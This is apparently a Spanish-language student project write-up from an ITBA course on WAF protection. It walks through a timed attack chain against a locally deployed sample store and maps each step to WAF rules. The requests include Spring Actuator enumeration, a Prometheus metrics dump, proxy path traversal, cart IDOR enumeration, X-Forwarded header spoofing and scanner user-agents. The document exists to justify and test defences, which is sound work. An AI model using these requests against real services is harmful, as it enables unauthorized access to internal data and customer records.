# Demo de explotación · Kill Chain de The Store sin WAF
## TPE — Protección de Servicios con WAF · ITBA · 1C 2026

> Este documento cuenta la **historia paso a paso** de cómo un atacante externo, partiendo solo del puerto 80 de la app, escala desde reconocimiento hasta exfiltración masiva y abuse de microservicios internos. Cada paso lleva la request exacta, la respuesta capturada en vivo el 16/04/2026 y el aprendizaje para el WAF.
>
> **El objetivo de la demo no es lucirse "hackeando":** es construir la justificación cuantificable de por qué necesitamos un WAF. Se proyecta como pieza central en la presentación final junto al dashboard interactivo (`demo/exploit-dashboard.html`).
>
> **Cómo se reproduce:** levantar el cluster con `./local.sh create-cluster --skip-tests`, abrir Chrome en `http://localhost`, abrir DevTools → Console y pegar los `fetch` listados, *o* abrir directamente `demo/exploit-dashboard.html` y clickear "Run All".

---

## Resumen del impacto

Tres afirmaciones del informe estático fueron **confirmadas en vivo** y una se vio **agravada**:

| Afirmación original | Estado tras la demo |
|---|---|
| Cualquier persona con acceso a `http://localhost` puede dumpear las métricas Prometheus | ✅ Confirmado: 24-25 KB por request, 175+ series, sin throttling |
| Los backends `carts`, `orders` y `checkout` (ClusterIP) son alcanzables vía proxy | ✅ Confirmado: el backend `carts` responde con datos de cualquier `customerId` (IDOR adicional descubierto) |
| Si se activa `env`/`heapdump` en el actuator, el atacante los obtiene | ✅ Confirmado: hoy devuelven 404 *solo* porque no están en el `include` — no hay nada externo (red, WAF, código) que los proteja si alguien los habilita |

**Hallazgo nuevo no previsto:** path traversal del proxy escapa al UI propio (`/proxy/catalog/../../actuator/prometheus` → 200 OK con todas las métricas).

**Hallazgo nuevo descubierto durante la demo:** IDOR de carritos vía `/proxy/carts/<cualquier-customerId>` retorna 200 OK con el carrito de ese cliente sin necesidad de autenticación.

---

## Personajes y supuestos del ataque

- **Atacante:** Mallory. Acceso desde Internet al puerto 80 de la víctima (en producción, simplemente el dominio público; en local, `http://localhost`).
- **Víctima:** The Store, recién desplegado con `./local.sh create-cluster`, defaults de fábrica del `retail-store-sample-app`.
- **Capacidades:** un navegador. Sin escáner automatizado. Sin credenciales. Sin ingeniería social. Solo HTTP.
- **Tiempo invertido:** menos de 5 minutos hasta exfiltrar las métricas.

---

## Fase 1 · Reconocimiento (segundos 0-15)

**Objetivo:** detectar el stack y la presencia de paneles administrativos olvidados.

### Paso 1.1 · Mirar la home

```
GET http://localhost/
→ HTTP 200 · text/html · 19.973 bytes
```

La página renderiza correctamente. En el HTML hay un `<title>Demo Store</title>` y assets bajo `/assets/css/theme-default/...`. No hay indicios obvios del framework. Hasta acá, una app web cualquiera.

### Paso 1.2 · Probar paths conocidos de Spring Boot Actuator

Mallory sabe que Spring Boot expone por convención el endpoint `/actuator/info`. Es la primera prueba que hacen los scanners porque:
- Un 200 OK confirma Spring Boot.
- Si no está restringido, suele haber **muchos otros endpoints abiertos**.

```
GET http://localhost/actuator/info
→ HTTP 200 · application/vnd.spring-boot.actuator.v3+json · 2 bytes
→ Body: {}
```

**Veredicto Mallory:** "Spring Boot Actuator está habilitado. Voy a enumerar el resto."

### Paso 1.3 · Auditar headers de seguridad

```js
fetch('/').then(r => ['strict-transport-security','x-frame-options','x-content-type-options','content-security-policy','referrer-policy','permissions-policy'].map(h => `${h}: ${r.headers.get(h) || 'MISSING'}`));
```

Resultado: **6/6 headers MISSING**. No hay HSTS, no hay CSP, no hay X-Frame-Options. Mallory sabe que:
- Puede enmarcar el sitio en su propio dominio (clickjacking).
- Puede inyectar payloads que aprovechen MIME sniffing.
- Puede degradar a HTTP plano si tiene un MITM.

---

## Fase 2 · Enumeración del Actuator (segundos 15-45)

**Objetivo:** listar todos los endpoints de monitoreo expuestos y elegir el más jugoso.

### Paso 2.1 · `/actuator/health`

```
GET http://localhost/actuator/health
→ HTTP 200
→ Body: {"status":"UP","groups":["liveness","readiness"]}
```

Confirma que la app está sana y revela los grupos de health probes. Algunas implementaciones de Spring exponen aquí también el estado de cada downstream (DB, Redis, etc.) — Mallory probará variantes:

```
GET /actuator/health/liveness  → 200 OK
GET /actuator/health/readiness → 200 OK
```

### Paso 2.2 · `/actuator/metrics`

```
GET http://localhost/actuator/metrics
→ HTTP 200 · 1.006 bytes
→ Body (extracto):
  {"names":["application.ready.time","application.started.time",
   "disk.free","disk.total","executor.active","executor.completed",
   "executor.pool.core","http.client.requests","http.server.requests",
   "jvm.buffer.count","jvm.buffer.memory.used", ...]}
```

Lista de **44 métricas instrumentadas**. Mallory ya sabe que existe Prometheus — el siguiente paso es ir directo a la fuente.

---

## Fase 3 · Exfiltración masiva vía Prometheus (segundos 45-90)

**Objetivo:** obtener un dump del estado interno con una sola request.

### Paso 3.1 · Una request, 25 KB de oro

```
GET http://localhost/actuator/prometheus
→ HTTP 200 · 24.468 bytes (creció a 25.383 bytes durante mi propia navegación)
```

**175 series exportadas.** Lo que Mallory extrae con un único parser regex sobre el body:

```javascript
{
  disk_total_gb:    1081,           // capacidad de disco del nodo
  disk_free_gb:     1002,           // 92% libre
  jvm_memory_max_mb: 107,           // heap pequeño = posible blanco para DoS
  uptime_s:         2214,           // 37 minutos arriba (recién deployado)
  main_class:       "com.amazon.sample.ui.UiApplication",  // base para buscar CVEs
  exception_types:  ["ApiException"],  // huella de stack Java
  tracked_paths:    ["/", "/cart", "/cart/remove", "/catalog",
                     "/checkout", "/proxy/carts/**", "/proxy/catalog/**",
                     "/proxy/checkout/**", "/proxy/orders/**",
                     "/actuator/health", "/actuator/info", "/actuator/metrics"]
}
```

**Lo brutal:** las **rutas que aparecen en `tracked_paths` son las que están siendo llamadas en este momento por usuarios reales y otros atacantes**. Mallory acaba de obtener un mapa de actividad gratis. Más aún:
- Ve `/proxy/carts/**` y se entera de que existe un proxy hacia los backends.
- Ve `/proxy/catalog/**`, `/proxy/orders/**`, `/proxy/checkout/**` → mapea los 4 microservicios internos sin tener que adivinarlos.

> **Esta es la pivot point del ataque.** Sin Prometheus, Mallory hubiese tardado horas en descubrir el proxy. Con Prometheus, lo encontró en 30 segundos.

---

## Fase 4 · Descubrimiento del proxy (segundos 90-120)

**Objetivo:** confirmar que `/proxy/<svc>/...` es un router real hacia microservicios internos.

### Paso 4.1 · Probar con un servicio inexistente

```
GET http://localhost/proxy/notreal/foo
→ HTTP 404
→ Body: {"timestamp":"...","path":"/proxy/notreal/foo",
         "status":404,"error":"Not Found","requestId":"dfad1b24-387"}
```

El error viene de Spring (formato JSON con `requestId`). El proxy sabe que `notreal` no es un servicio configurado.

### Paso 4.2 · Probar con `carts`

```
GET http://localhost/proxy/carts/anything
→ HTTP 200
→ Body: {"customerId":"anything","items":[]}
```

⚠️ **Bingo.** Tres descubrimientos simultáneos:

1. El proxy *sí* tiene a `carts` mapeado.
2. El backend `carts` (microservicio Spring Boot ClusterIP) **respondió desde fuera del cluster** — algo que NO debería poder ocurrir por diseño Kubernetes.
3. **El path segment se interpreta como `customerId`** y el backend devuelve el carrito de ese ID sin pedir autenticación. Es decir: **IDOR**.

### Paso 4.3 · Explotar el IDOR

Mallory itera customer IDs:

```
GET /proxy/carts/admin     → {"customerId":"admin","items":[]}
GET /proxy/carts/test      → {"customerId":"test","items":[]}
GET /proxy/carts/1         → {"customerId":"1","items":[]}
GET /proxy/carts/00000000-0000-0000-0000-000000000000 → 200 OK
```

En este despliegue todos los carritos están vacíos (la app está recién levantada), pero **en producción cualquier carrito de cualquier cliente queda expuesto a enumeración**. El backend no requiere autenticación en este endpoint porque asume que está aislado en la red privada del cluster — asunción que el `ProxyController` rompe.

**¿Y escribir?** Mallory prueba:

```
POST /proxy/carts/victim/items  body={...}
→ HTTP 405 Method Not Allowed
```

Buena suerte: el `ProxyController` solo expone `@GetMapping` (no `POST`). Si algún día alguien agrega `@PostMapping` "para que la API sea simétrica", Mallory podría inyectar productos en el carrito de cualquier víctima.

### Paso 4.4 · Confirmar el resto de backends

```
GET /proxy/orders/anything   → 404 con formato Spring (orders es Spring Boot)
GET /proxy/checkout/anything → 404 con "{message:'Checkout not found',...,statusCode:404}" (NestJS)
```

Mallory ahora sabe el stack de cada microservicio: **catalog (Go/Gin), carts (Spring Boot), orders (Spring Boot), checkout (NestJS)**. Esa información alimenta la búsqueda de exploits específicos por stack.

---

## Fase 5 · Path traversal: escape al UI (segundos 120-150)

**Objetivo:** usar el proxy como pivote para alcanzar paths que el UI hubiese podido restringir.

### Paso 5.1 · El truco

```
GET http://localhost/proxy/catalog/../../actuator/info
→ HTTP 200
→ Body: {}
```

Análisis: el `ProxyController` arma la URL como `endpoint + path` donde `endpoint = "http://catalog"` y `path = "/catalog/../../actuator/info"` (lo que viene después de `/proxy`). La librería de proxy de Spring (`ProxyExchange`) **normaliza el URI antes de hacer el forward**, y los `..` pueden colapsar por encima del root del host. El resultado es que la request llega a una URL que apunta a `http://localhost/actuator/info` — el endpoint Actuator del propio UI.

### Paso 5.2 · Repetir con prometheus

```
GET http://localhost/proxy/catalog/../../actuator/prometheus
→ HTTP 200 · 25.383 bytes
```

**El mismo dump de 25 KB de métricas, ahora vía traversal.** Esto importa porque:

- Si en el futuro se agrega una regla de Nginx que bloquee `/actuator/...`, el atacante seguiría obteniendo las métricas via `/proxy/<svc>/../../actuator/...`.
- Cualquier filtro hecho a nivel UI (e.g. una `WebFilter` de Spring Security para Actuator) será bypassable por esta misma vía si el filtro mira el path crudo y el proxy lo reescribe.
- El WAF en el ingress es la **única capa que ve la request original** y puede bloquear ambos vectores.

### Paso 5.3 · Variantes de bypass

```
GET /proxy/catalog/%2e%2e%2f%2e%2e%2factuator%2finfo
→ HTTP 404 ("page not found", devuelto por catalog Go)
```

La traversal con doble URL-encoding **NO funciona** acá porque Spring normaliza antes que el catalog reciba la request. Esto es información valiosa para tunear el WAF: la regla CRS 930120 (RFI/LFI) cubre ambas variantes con su decoding chain.

---

## Fase 6 · Defense bypass (segundos 150-180)

**Objetivo:** verificar que ninguna defensa perimetral está activa.

### Paso 6.1 · Spoofing de cabeceras

```
GET http://localhost/
Headers:
  X-Forwarded-For: 8.8.8.8
  X-Forwarded-Proto: https
  X-Forwarded-Host: evil-bank.com
→ HTTP 200, body completo, sin protesta
```

`forward-headers-strategy: NATIVE` (visto en `application.yml`) hace que Spring confíe en estos headers. Implicancia: los logs de la app van a registrar **8.8.8.8** como IP de origen, no la IP real de Mallory. Cualquier sistema posterior de IP-banning queda anulado.

### Paso 6.2 · User-Agents de scanner

```
GET / -A "Mozilla/5.00 (Nikto/2.5.0)"           → 200 OK
GET / -A "sqlmap/1.7.2#stable (https://sqlmap.org)" → 200 OK
GET / -A "Nuclei - Open-source project (...)"   → 200 OK
GET / -A "DirBuster-1.0-RC1 (...)"              → 200 OK
```

**Cero detección de scanners conocidos.** OWASP CRS regla `913100` los matchea por User-Agent y devuelve 403 directo. Hoy: pasan todos.

### Paso 6.3 · Rate limit

```
50 requests en paralelo a "/"
→ Duración: 597 ms · Throughput: 167 req/s
→ Distribución de códigos: {"200": 50}
```

**Cero throttling.** Mallory puede correr `dirbuster` con 100 hilos sin que la app reaccione.

---

## Fase 7 · Escalada hipotética (lo que pasa mañana si nadie reacciona)

Hoy `/actuator/env` y `/actuator/heapdump` devuelven 404 porque no están incluidos en `application.yml` (`include: info,health,metrics,prometheus`). Pero eso depende de **una sola línea de configuración**.

Si mañana un dev agrega `env` al include "para debuggear":

```
GET http://localhost/actuator/env
→ HTTP 200 · JSON con TODAS las variables de entorno del pod, incluyendo:
  - RETAIL_CATALOG_PERSISTENCE_PASSWORD (visible en kubernetes.yaml decodificable)
  - JAVA_OPTS, KUBE_*, AWS_* si los hay
  - propiedades de Spring resueltas (database URLs con credenciales si las hubiera)
```

Si agrega `heapdump`:

```
GET http://localhost/actuator/heapdump
→ HTTP 200 · binario de varios MB con el heap del JVM
→ Mallory lo abre con Eclipse MAT y extrae sesiones, tokens, payloads
```

**Sin WAF, esto pasa instantáneamente.**
**Con WAF**, la regla custom (`SecRule REQUEST_URI "@rx ^/actuator/(env|heapdump|...)" deny`) bloquea estos paths *aunque la app los habilite*.

Esto es defense in depth puro: el WAF protege contra cambios futuros en la config de la app, sin que el equipo de devs tenga que recordar las restricciones.

---

## Resumen ejecutivo de la demo

| Fase | Duración | Resultado |
|---|---|---|
| 1 · Recon | 15 s | Stack detectado: Spring Boot · Headers de seguridad: 0/6 |
| 2 · Enum Actuator | 30 s | 4 endpoints abiertos: info, health, metrics, prometheus |
| 3 · Exfiltración | 45 s | **25 KB** dumpeados con 1 request, mapa de microservicios incluido |
| 4 · Proxy SSRF | 30 s | 4 backends ClusterIP alcanzables · **IDOR confirmado** en `/proxy/carts/{id}` |
| 5 · Path traversal | 30 s | Actuator del UI alcanzable vía `/proxy/<svc>/../..` |
| 6 · Defense bypass | 30 s | Sin scanner detection, sin rate limit, X-Forwarded-* spoofeable |
| **Total** | **3 min** | **6/6 vectores explotables sin código, sin herramientas, sin auth** |

---

## Mapa "ataque → regla WAF que lo mitiga"

| Ataque demostrado | Mitigación post-WAF |
|---|---|
| Detección de stack via /actuator/info | Custom rule `id:9001` bloquea `/actuator/(info\|env\|heapdump\|...)` |
| Headers de seguridad ausentes | `Header always set X-Content-Type-Options "nosniff"` etc. en el snippet de Nginx |
| Exfiltración de Prometheus | Custom rule `id:9001` bloquea `/actuator/prometheus` (incluida en la lista negra) |
| Pivote a backends ClusterIP via /proxy | Custom rule `id:9003` bloquea `^/proxy/.*\.\.` (path traversal en proxy) + opcional bloquear todo `/proxy/.*/(actuator\|admin\|debug)` |
| IDOR en /proxy/carts/{id} | Custom rule `id:9004` requiere auth header (`SecRule REQUEST_URI "@beginsWith /proxy/carts/" "chain,deny" SecRule REQUEST_HEADERS:Authorization "@rx ^$"`) |
| Path traversal /proxy/.../../actuator/* | OWASP CRS familia 930xxx (LFI/path traversal) |
| Spoofing de X-Forwarded-* | `SecRule REQUEST_HEADERS:X-Forwarded-For "@rx .+" "phase:1, setvar:request_headers.X-Forwarded-For=%{REMOTE_ADDR}"` |
| User-Agents de Nikto/sqlmap/etc. | OWASP CRS familia 913xxx (scanner detection) |
| Sin rate limit | `nginx.ingress.kubernetes.io/limit-rps: "10"` y `limit-connections: "5"` en el Ingress + reglas CRS de offender tracking |

---

## Cómo se reproduce esto en el TP

### Opción A: Dashboard interactivo (recomendado para la demo del 9/6)

```bash
# en la máquina del demo
cd WAF-redes-ITBA
open demo/exploit-dashboard.html   # macOS
xdg-open demo/exploit-dashboard.html  # Linux
```

Abre un dashboard con cada exploit como botón. Click en **"Run All Exploits"** y se ejecutan los 18 tests contra `http://localhost`, mostrando para cada uno: status code, latencia, bytes leakeados, body de respuesta y veredicto (🔴 vulnerable / 🟢 bloqueado). Tiene también botones para exportar resultados a JSON y para copiar un reporte markdown al portapapeles.

### Opción B: Script bash con curls

```bash
chmod +x tests/01-pre-waf-attacks.sh
./tests/01-pre-waf-attacks.sh 2>&1 | tee resultados-pre-waf.txt
```

### Opción C: Console del navegador

Abrir Chrome en `http://localhost`, DevTools → Console, pegar:

```js
// SSRF + IDOR + Traversal en una sola línea
['/actuator/prometheus','/proxy/carts/admin','/proxy/catalog/../../actuator/prometheus']
  .forEach(u => fetch(u).then(r => r.text()).then(b => console.log(u, '→', r.status, b.slice(0,100))));
```

---

## Próximos pasos

1. Esta demo se monta como **slide central** del PPT final ("Antes vs Después").
2. Una vez desplegado el WAF, se vuelve a correr el dashboard y se captura el "Después": todos los `🔴 vulnerable` deberían convertirse en `🟢 blocked`.
3. La diferencia se exporta a JSON y se incluye en el `how-to` del repo GitHub como evidencia de validación del POC.
